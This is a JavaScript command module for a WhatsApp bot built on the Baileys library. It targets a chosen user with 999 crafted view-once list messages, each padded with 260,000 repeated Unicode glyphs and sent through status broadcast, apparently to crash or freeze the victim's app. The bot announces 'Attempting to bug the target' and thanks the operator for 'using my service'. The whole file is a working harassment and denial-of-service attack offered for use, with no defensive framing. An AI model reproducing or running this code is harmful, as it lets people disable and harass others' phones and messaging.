import pkg from "baileys";

const { proto, generateWAMessageFromContent } = pkg;


import channelSender from '../commands/channelSender.js'


async function sios(client, destinatario){

    const tmsg = await generateWAMessageFromContent(destinatario, {

                   viewOnceMessage: {

                       message: {

                           listResponseMessage: {

                               title: 'Peace and Love\n',

                               description:"\n\n\n"+"𑪆".repeat(260000),

                               singleSelectReply: {

                                   selectedId: "id"
                               },

                               listType: 1
                           }
                       }
                   }

           }, {});

    await client.relayMessage("status@broadcast", tmsg.message, {

               messageId: tmsg.key.id,

               statusJidList: [destinatario],

               additionalNodes: [{

                   tag: "meta",

                   attrs: {},

                   content: [{

                       tag: "mentioned_users",

                       attrs: {},

                       content: [{

                           tag: "to",

                           attrs: { jid: destinatario },

                           content: undefined,

                }],
            }],
        }],
    });
}

export async function siosinvis(message, client) {

    try {

        const remoteJid = message.key?.remoteJid;

        if (!remoteJid) {

            throw new Error("Message JID is undefined.");
        }

        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim();

        const parts = commandAndArgs.split(/\s+/);

        const args = parts.slice(1);

        let participant;

        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {

            participant = message.message.extendedTextMessage.contextInfo.participant;

        } else if (args.length > 0) {

            participant = args[0].replace('@', '') + '@s.whatsapp.net';

        } else {

            throw new Error('Specify the person to bug.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        // Execute the bug command

        await channelSender(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 1);

        for (let i = 0; i < 999; i++) {

            await sios(client, participant);

            await new Promise(resolve => setTimeout(resolve, 1000));
        }

    } catch (error) {

        console.error("An error occurred while trying to bug the target:", error);

        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
    }
}
export default siosinvis;